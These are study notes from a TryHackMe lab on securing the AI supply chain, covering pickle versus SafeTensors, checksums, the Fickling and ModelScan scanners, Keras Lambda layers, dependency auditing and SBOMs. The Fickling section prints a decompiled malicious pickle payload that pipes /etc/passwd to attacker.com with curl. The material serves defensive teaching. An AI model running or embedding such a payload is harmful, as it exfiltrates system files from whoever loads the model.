# Securing the AI Supply Chain — TryHackMe Notes

> **Big idea:** Don't trust a model just because it loads, comes from a familiar repository, or has a safe-looking file extension. Verify the file, inspect its behaviour and architecture, and audit everything it depends on.

---

## 1. Safe Serialisation Formats

### Why pickle is risky

Python's `pickle` format can reconstruct Python objects, but it can also execute code during deserialisation. An attacker can abuse methods such as `__reduce__` to make a payload run when someone loads the file.

**Real-life analogy:** Imagine receiving a sealed parcel. You expect a book, but opening it triggers a hidden mechanism. With an unsafe pickle, loading the file can trigger code you never intended to run.

### Pickle vs SafeTensors

| Feature | Pickle | SafeTensors |
|---|---|---|
| Structure | Can represent arbitrary Python objects and instructions | JSON header + raw binary tensor data |
| Code execution while loading | Possible | The format cannot encode executable instructions |
| Content | General Python objects | Tensor data such as weights and biases |
| Validation | Deserialisation can execute embedded operations | Header is parsed and validated before tensor data is read |
| Speed | Moderate | Designed for efficient loading, including zero-copy memory mapping |

**SafeTensors** was created for machine-learning model weights. Its key security benefit is that loading a SafeTensors file does not execute Python code from the file.

### Converting a pickle model

The conversion process itself can be dangerous if the original pickle is malicious. Restrict the load operation first:

```python
import torch
from safetensors.torch import save_file, load_file

# Load with PyTorch's restricted unpickler
model_weights = torch.load("model.pkl", weights_only=True)

# Save only tensor weights in SafeTensors format
save_file(model_weights, "model.safetensors")

# Load the SafeTensors file
safe_weights = load_file("model.safetensors")
```

**Important limitations:**
- SafeTensors stores tensor data, not arbitrary Python objects.
- It does not store every part of a training setup, such as optimiser state or training configuration.
- It reduces serialisation-level code-execution risk; it does not prove that the weights or model behaviour are trustworthy.

### Defence 2: `weights_only=True`

PyTorch uses pickle internally when loading many `.pt` / `.pth` files. The restricted option limits what the unpickler can reconstruct.

```python
import torch

# Unsafe: unrestricted pickle deserialisation
model = torch.load("model.pt")

# Safer: restrict loading to tensor-related objects
model = torch.load("model.pt", weights_only=True)
```

Think of `weights_only=True` as a **straitjacket**: the file can provide tensor data, but it cannot freely import modules and invoke arbitrary functions.

- Starting with **PyTorch 2.6**, `weights_only=True` is the default behaviour.
- On earlier versions, set it explicitly.
- It is a risk-reduction measure, not a reason to load unknown files casually.

### What SafeTensors does NOT protect against

1. **Fake file extensions:** A file named `model.safetensors` is not automatically a genuine SafeTensors file. Verify the actual format, not just the extension. The room references CVE-2023-6730 and an issue involving Hugging Face's SFConvertBot.
2. **Malicious architecture logic:** A Keras Lambda layer can execute Python when the model performs inference.
3. **Malicious weights / behaviour:** A model can contain a backdoor or poisoned behaviour even if its file format is safe.

**Remember:** Safe serialisation is necessary, but not sufficient.

---

## 2. Model Verification and Provenance

A model may come from a familiar organisation and still have been changed or replaced. Safe loading does not prove that the file is the one its author intended to publish.

### Lab directory structure

```text
/opt/supply-chain/
├── models/    # Model files and checksums
├── project/   # Sample ML project and dependencies
└── tools/     # Pre-built analysis scripts
```

### SHA-256 checksum verification

A **checksum** is a fixed-length value calculated from a file's contents. If the file changes, its SHA-256 hash should change too.

The lab gives you an expected-hash file and three model files. Your job is to identify the model whose actual hash does not match the published value.

**Step 1 — Read expected hashes:**

```bash
cat /opt/supply-chain/models/checksums.json
```

**Step 2 — Calculate actual hashes:**

```bash
sha256sum \
  /opt/supply-chain/models/product_recommender.safetensors \
  /opt/supply-chain/models/model_review_v2.pkl \
  /opt/supply-chain/models/product_recommender.pkl
```

**Step 3 — Compare each result** with the corresponding value in `checksums.json`.

- Matching hash → file contents match the file represented by that expected hash.
- Different hash → file has changed since the expected hash was generated, or the expected hash refers to a different artefact.

A checksum verifies **integrity**, not the identity of the publisher. A digital signature can additionally help verify who signed/published an artefact.

### Model cards

A **model card** is documentation describing a model, its intended use, training, performance, and limitations.

Check these sections:

| Section | What to look for |
|---|---|
| Model details | Author, organisation, version, licence |
| Intended use | What the model is designed to do |
| Training data | Dataset names, sizes, and sources |
| Performance | Benchmark metrics and realistic claims |
| Limitations | Known failure modes, biases, and weaknesses |

A missing or very sparse model card is a warning sign. A model card is useful evidence, but documentation alone does not prove that a model is safe.

### Borrowed weights: LoRA adapters

**LoRA (Low-Rank Adaptation)** is a parameter-efficient fine-tuning method. Instead of retraining an entire base model, a smaller adapter is attached to it to change or specialise its behaviour.

Example:
- Base model = a phone.
- LoRA adapter = an add-on that changes what the phone can do.
- A clean base model plus a malicious adapter can still create a compromised system.

Apply the same intake process to adapters as to full models:
1. Quarantine the adapter.
2. Verify its source.
3. Scan it.
4. Review it before merging it with the base model.

### Model merging and conversion services

Third-party services may merge models or convert them between formats. The output is a **new artefact**: it may not be identical to the original file.

Treat converted or merged models as new files:
- Verify their source and processing history.
- Recalculate and compare hashes.
- Scan the output again.
- Inspect the architecture and metadata.

---

## 3. The Model Acquisition Framework

Every model file, adapter, or converted output should pass through a controlled intake process before production.

| Gate | Action | Purpose |
|---|---|---|
| 1. Quarantine | Download into an isolated staging area | Keep untested artefacts away from production |
| 2. Source verification | Check author, organisation, repository, history, and reputation | Establish provenance |
| 3. Integrity check | Calculate SHA-256 and compare with the publisher's value | Detect changes in transit or after publication |
| 4. Security scan | Use tools such as Fickling and ModelScan; audit dependencies and model card | Find suspicious content and known risks |
| 5. Approve or reject | Promote only after review; otherwise keep quarantined | Enforce a trust boundary |

**Why multiple gates?** A model can pass a scanner and still contain a subtle data-poisoning backdoor. No single check is enough.

Model registries can help enforce states such as `untested` and `approved`. Examples mentioned in the room:
- MLflow Model Registry
- AWS SageMaker Model Registry
- Azure ML Model Registry
- Hugging Face Hub

### What changes when the model is API-based?

You may not receive a model file, so you cannot perform the same file checksum or local model scan. The room's API equivalents include:
- Provider due diligence instead of source verification.
- Behaviour monitoring instead of checksum verification.
- System-prompt governance instead of scanning a downloaded model.
- Sandboxed evaluation instead of a file-staging gate.

---

## 4. Behavioural Analysis and Model-Load Telemetry

A malicious pickle can look like a normal model to a user. Telemetry can expose what happens during loading.

### Clean model-load baseline

```text
SESSION START — model_load
MODEL LOAD BEGIN — /models/sentiment_model.pkl (pickle)
FILE ACCESS — /models/sentiment_model.pkl (rb) [normal]
MODEL LOAD COMPLETE — object_type: SentimentModel
SESSION STOP — model_load
```

A normal load reads the file and returns the expected model object.

### Suspicious signals

Look for events that do not belong in an ordinary model load:

- Unexpected imports, especially modules such as `os`.
- Shell or process execution, such as `os.system` or `subprocess`.
- Access to sensitive files such as `/etc/passwd`.
- Network requests to unfamiliar external hosts.
- A strange object type returned instead of the expected model.

In the room's example, the model attempted to send `/etc/passwd` to an external server. The connection was refused, but the attempted action was still a serious security event.

**Important lesson:** A model can answer prompts normally while doing something malicious behind the scenes. Normal-looking output does not prove safe behaviour.

### How production telemetry can be collected

The room describes:
- Running model loading in a sandboxed subprocess.
- Enabling Python audit hooks with `sys.addaudithook()`.
- Monitoring events such as imports and system/process calls.
- Using an instrumented unpickler that overrides `find_class()` to log which modules and classes a pickle tries to resolve.

Python audit hooks were introduced in Python 3.8. They can provide visibility into interpreter-level events.

---

## 5. Scanning Models Before Use

Scanning should happen **before** loading an untrusted model.

### Fickling — static pickle analysis

**Fickling**, from Trail of Bits, analyses pickle bytecode and decompiles it into readable Python-like code without executing the pickle.

Run it on the suspicious model:

```bash
fickling /opt/supply-chain/models/model_review_v2.pkl
```

The room's expected decompiled payload:

```python
from os import system
_var0 = system('curl http://attacker.com/exfil -d @/etc/passwd')
result0 = _var0
```

This exposes the suspicious behaviour:
- Imports `system` from `os`.
- Runs `curl`.
- Attempts to send `/etc/passwd` to an external server.

Compare it with the clean model:

```bash
fickling /opt/supply-chain/models/product_recommender.pkl
```

The clean example serialises a plain dictionary and has no suspicious imports or function calls.

### Automated Fickling safety check

```bash
fickling --check-safety -p /opt/supply-chain/models/model_review_v2.pkl
```

- `--check-safety` asks Fickling to assess the pickle.
- `-p` prints the assessment in the terminal.
- Without `-p`, the room says results are written to `safety_results.json`.

Check the clean file too:

```bash
fickling --check-safety -p /opt/supply-chain/models/product_recommender.pkl
```

No output means the tool did not detect an issue; it does **not** prove the file is completely safe.

### ModelScan — multi-format model scanning

**ModelScan**, from Protect AI, scans multiple model formats, including PyTorch, TensorFlow, and Keras.

Scan the suspicious pickle:

```bash
modelscan -p /opt/supply-chain/models/model_review_v2.pkl
```

The room's expected result is one **CRITICAL** finding: unsafe operator `system` from module `os`.

Scan the SafeTensors model:

```bash
modelscan -p /opt/supply-chain/models/product_recommender.safetensors
```

The room's expected result is no detected issues.

### Interpreting severity

| Severity | Meaning in the room | Suggested response |
|---|---|---|
| CRITICAL | Confirmed dangerous operation, e.g. `os.system` or `subprocess` | Do not use; quarantine immediately |
| HIGH | Likely dangerous operation, e.g. `eval` or network calls | Do not use without thorough review |
| MEDIUM | Suspicious but potentially legitimate behaviour | Investigate carefully |
| LOW | Informational finding, such as non-standard pickle opcodes | Record and monitor |

**Scanner limitations:** Fickling and ModelScan look for detectable patterns. Obfuscation and unknown attack techniques may evade them. Scanning is one layer of defence, not a guarantee.

**Lab note:** ModelScan may print CUDA-driver warnings on a VM without a GPU. The room says these are cosmetic; focus on the `--- Summary ---` section.

---

## 6. Architecture-Level Threats

Not every malicious model runs code while loading. Attackers can put logic into the model architecture itself.

### Keras Lambda layers

A **Lambda layer** lets a Keras model use a custom Python function as part of its architecture.

That can be legitimate, but an attacker can hide malicious logic inside one.

| Pickle payload | Malicious Lambda layer |
|---|---|
| Can execute during deserialisation / loading | Executes during inference |
| May be exposed by pickle analysis | Requires architecture inspection |
| Can be caught by pickle-focused scanning | Needs checks for Lambda/custom layers and their code |

**Inference** means the model is processing an input to produce a prediction.

A malicious Lambda layer can therefore:
- Load without an obvious suspicious event.
- Pass a checksum check if the checksum matches the malicious file.
- Trigger only when the model handles real inputs.

The room emphasises that architecture-level logic is not made harmless simply by changing the file container. Inspect the architecture as well as the serialisation format.

### Detecting suspicious architecture

A clean model inspection might show:

```text
SESSION START — model_inspect
MODEL INSPECT BEGIN — /models/image_classifier.h5 (keras_h5) via h5py
LAYER — InputLayer "input_layer" [clean]
LAYER — Flatten "flatten" [clean]
LAYER — Dense "dense" [clean]
LAYER — Dense "dense_1" [clean]
MODEL INSPECT COMPLETE — 4 layers, 0 suspicious
SESSION STOP — model_inspect
```

The room's candidate model has **five layers**, not four. The extra layer is a Lambda function marked `SUSPICIOUS`.

### ModelScan architecture scan

```bash
modelscan -p /opt/supply-chain/models/image_classifier_v2.h5
```

The room's expected result is a **MEDIUM** finding for an unsafe `Lambda` operator from Keras.

Why MEDIUM, not automatically CRITICAL?
- Lambda layers can be used legitimately.
- Their presence is suspicious in a model you did not build.
- The code and purpose need further investigation.

### Inspect the H5 structure

The room provides a helper script that uses `h5py` to inspect the file structure without loading the model as an executable model:

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py \
  /opt/supply-chain/models/image_classifier.h5

python3 /opt/supply-chain/tools/inspect_h5_model.py \
  /opt/supply-chain/models/image_classifier_v2.h5
```

Compare the output:
- How many layers are present?
- Which layer is marked `[WARNING]` instead of `[OK]`?
- Is there a Lambda or custom layer?
- What function is configured?

Do not trust a harmless-looking function name such as `normalize_output` or `apply_scaling` without reviewing what it actually does.

**Key takeaway:** Inspect both the file's serialisation and the model's architecture.

---

## 7. Dependency Auditing and SBOMs

Models are only one part of the AI supply chain. The packages and libraries used by the project can also be compromised.

### Version pinning

If a dependency is unpinned, pip may install a newer release later. A malicious or compromised update could then enter the environment.

```text
# BAD: no version constraint
numpy
requests

# BETTER: restrict to a version range
numpy>=1.24,<1.25
requests>=2.31,<2.32

# BEST in this room's example: exact versions
numpy==1.24.3
requests==2.31.0
```

Exact version pinning makes the intended package versions explicit.

### Lockfiles

A lockfile can record exact dependency versions and hashes, helping ensure repeatable installs and detect package-content changes.

| Tool | Lockfile / output | Command |
|---|---|---|
| pip-tools (`pip-compile`) | Requirements file with hashes | `pip-compile --generate-hashes` |
| Poetry | `poetry.lock` | `poetry lock` |

The hash check matters because a package could theoretically be replaced while keeping the same version number.

### pip-audit — known vulnerability scanning

`pip-audit` checks dependencies against known vulnerability information.

Run it on the lab project:

```bash
pip-audit -r /opt/supply-chain/project/requirements.txt
```

Review each finding for:
- Package name.
- Installed version.
- Advisory ID.
- Fixed version, if available.

Count the distinct vulnerable **packages**, not only the number of CVEs. One package may have multiple advisories.

### Private package indices and dependency confusion

Organisations may host internal packages in a private package registry. This helps control where internal dependencies come from.

The room shows this example configuration:

```ini
# ~/.pip/pip.conf
[global]
index-url = https://your-private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
```

Concepts:
- `index-url` sets the primary package index.
- `extra-index-url` adds another package index.
- Internal package names should be managed through a trusted private registry.

**Dependency confusion** happens when a package manager retrieves a malicious public package that uses the same name as an internal package.

> Practical security note: do not assume that setting a private `index-url` plus a public `extra-index-url` automatically eliminates dependency-confusion risk. Package managers may consider candidates from multiple configured indexes. Strong controls include avoiding ambiguous package names, controlling package sources, and enforcing trusted internal package resolution.

---

## 8. What Is an SBOM?

**SBOM** stands for **Software Bill of Materials**.

Think of it as an ingredient list for a software project. It records the components that make up the project, including packages, libraries, frameworks, and versions.

Why it matters:
- Helps identify whether a project uses a newly vulnerable package.
- Makes direct and transitive dependencies more visible.
- Supports licence and compliance reviews.
- Helps teams understand what is actually included in a deployment.

### SBOM formats

| Format | Maintained by | Main strength |
|---|---|---|
| SPDX | Linux Foundation | Licence compliance; ISO/IEC 5962:2021 |
| CycloneDX | OWASP | Security-focused; can include vulnerability information |

Choose based on the organisation's needs. Both are widely used.

### Licence risks

AI projects may include models, datasets, and software under different licences.

Examples of possible issues:
- A model trained on restrictively licensed data may carry obligations.
- A copyleft dependency may impose conditions on distribution of the wider project.

An SBOM helps identify components and their licences so that teams can review compatibility before deployment.

### Generate an SBOM with Syft

**Syft**, from Anchore, analyses a project and generates an SBOM.

Generate CycloneDX JSON for the lab project:

```bash
syft /opt/supply-chain/project/ \
  --exclude './venv/**' \
  -o cyclonedx-json > /tmp/sbom.json
```

View a table summary:

```bash
syft /opt/supply-chain/project/ \
  --exclude './venv/**' \
  -o table
```

Pretty-print the JSON and scroll through it:

```bash
cat /tmp/sbom.json | python3 -m json.tool | less
```

Useful terminal controls in `less`:
- Arrow keys / Page Up / Page Down: move around.
- `q`: quit.

**Lab note:** The room says Syft may show an `i/o timeout` while checking for updates in an offline lab. This does not necessarily mean the local SBOM scan failed.

### ML-specific SBOMs

Traditional SBOMs focus on software components. ML projects also rely on artefacts that may not be fully represented:
- Models and model provenance.
- Datasets and their lineage.
- Data transformations and known biases.
- Training framework and process.
- Model performance and limitations.

The room describes ML SBOMs as an emerging area. For now, it recommends supplementing a standard SBOM with a **model card**.

---

## 9. Quick Revision Sheet

| Concept / tool | Remember this |
|---|---|
| Pickle | Can execute code during deserialisation |
| SafeTensors | Stores tensor data without pickle-style load-time code execution |
| `weights_only=True` | Restricts PyTorch's pickle loading behaviour |
| SHA-256 | Detects whether file contents differ from an expected hash |
| Digital signature | Can verify the publisher/signing identity as well as integrity |
| Model card | Documents model purpose, training, performance, and limitations |
| LoRA adapter | Small add-on that changes a base model; it also needs verification |
| Quarantine | Keep new artefacts isolated until checks are complete |
| Fickling | Static analysis / decompilation of pickle files |
| ModelScan | Scans multiple ML model formats |
| Lambda layer | Can run custom logic during inference |
| Version pinning | Controls which dependency version is installed |
| Lockfile | Records exact dependency versions and often hashes |
| `pip-audit` | Checks dependencies for known vulnerabilities |
| SBOM | Inventory of software components and dependencies |
| Syft | Generates SBOMs |
| SPDX | SBOM format with strong licence-compliance focus |
| CycloneDX | Security-focused SBOM format |

### The five model intake gates

**Quarantine → Verify source → Check integrity → Scan → Approve or reject**

### Memory hooks

- **Pickle = parcel with a possible hidden trigger.**
- **SafeTensors = weights only, no executable pickle instructions.**
- **Hash = file fingerprint.**
- **Model card = model's profile / nutrition label.**
- **SBOM = software ingredient list.**
- **Lambda = logic that may wait until prediction time.**

---

## 10. Self-Test

Try answering before checking the answers.

1. Why can loading an untrusted pickle file be dangerous?
2. What is the main security advantage of SafeTensors?
3. What does `weights_only=True` do in PyTorch?
4. Does a `.safetensors` file extension prove that the file is really SafeTensors?
5. What does a SHA-256 mismatch tell you?
6. What extra assurance can a digital signature provide over a checksum?
7. Why must LoRA adapters be checked like full model files?
8. What are the five stages of the Model Acquisition Framework?
9. What does Fickling analyse?
10. Why can a model with a Lambda layer pass a load-time check but still be dangerous?
11. What does `pip-audit` check?
12. What is the difference between an SBOM and a model card?
13. Which tool in this room generates an SBOM?
14. What is dependency confusion?

### Answers

1. Pickle deserialisation can execute embedded code.
2. The format cannot encode executable instructions; it stores tensor data.
3. It restricts deserialisation to tensor-related objects instead of unrestricted pickle behaviour.
4. No. Verify the actual file format, not just its extension.
5. The file contents differ from the contents represented by the expected hash.
6. It can help verify who signed/published the artefact.
7. A malicious adapter can change the behaviour of an otherwise clean base model.
8. Quarantine, source verification, integrity check, security scan, approve/reject.
9. Pickle bytecode, without executing the pickle.
10. A Lambda layer can execute custom logic at inference time rather than during loading.
11. Known vulnerabilities in project dependencies.
12. An SBOM inventories software components; a model card documents a model's purpose, training, performance, and limitations.
13. Syft.
14. A malicious public package may be selected because it shares a name with an internal package.

---

## 11. Practical Lab Command Checklist

```bash
# Inspect lab folders
ls -la /opt/supply-chain/{models,project,tools}

# Read expected hashes
cat /opt/supply-chain/models/checksums.json

# Calculate model hashes
sha256sum /opt/supply-chain/models/product_recommender.safetensors \
  /opt/supply-chain/models/model_review_v2.pkl \
  /opt/supply-chain/models/product_recommender.pkl

# Decompile pickle without loading it
fickling /opt/supply-chain/models/model_review_v2.pkl

# Run Fickling safety assessment
fickling --check-safety -p /opt/supply-chain/models/model_review_v2.pkl

# Scan a model with ModelScan
modelscan -p /opt/supply-chain/models/model_review_v2.pkl
modelscan -p /opt/supply-chain/models/product_recommender.safetensors

# Inspect Keras H5 architecture using the lab helper
python3 /opt/supply-chain/tools/inspect_h5_model.py \
  /opt/supply-chain/models/image_classifier_v2.h5

# Audit dependencies
pip-audit -r /opt/supply-chain/project/requirements.txt

# Generate a CycloneDX JSON SBOM
syft /opt/supply-chain/project/ \
  --exclude './venv/**' \
  -o cyclonedx-json > /tmp/sbom.json

# View SBOM in table form
syft /opt/supply-chain/project/ --exclude './venv/**' -o table
```

> **Safety reminder:** Do not use `pickle.load()` or unrestricted `torch.load()` on an untrusted model just to see what is inside. Prefer static analysis and isolated inspection first.
